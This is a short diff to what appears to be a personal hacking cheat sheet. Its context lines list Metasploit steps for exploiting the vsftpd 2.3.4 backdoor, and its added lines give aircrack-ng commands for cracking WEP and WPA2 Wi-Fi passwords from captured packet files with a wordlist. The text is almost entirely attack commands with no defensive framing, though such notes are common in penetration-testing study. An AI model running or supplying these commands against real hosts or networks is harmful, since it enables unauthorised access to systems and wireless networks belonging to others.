@@ -241,3 +241,9 @@ Step 2 : serach vsftpd( to get step 3 command)
 Step3 : use exploit/unix/ftp/vsftpd_234_backdoor
 Step 4: set RHOSTS IP
 Step 5: exploit
+#wifi hacking
+Cracking Wifi Password
+aircrack-ng [pcap file] (For cracking WEP network)
+aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)
+aircrack-ng '/home/[pcap file]' 
+aircrack-ng -b [Target BSSID] -w '/home/password text file' '/home/[pcap file]'
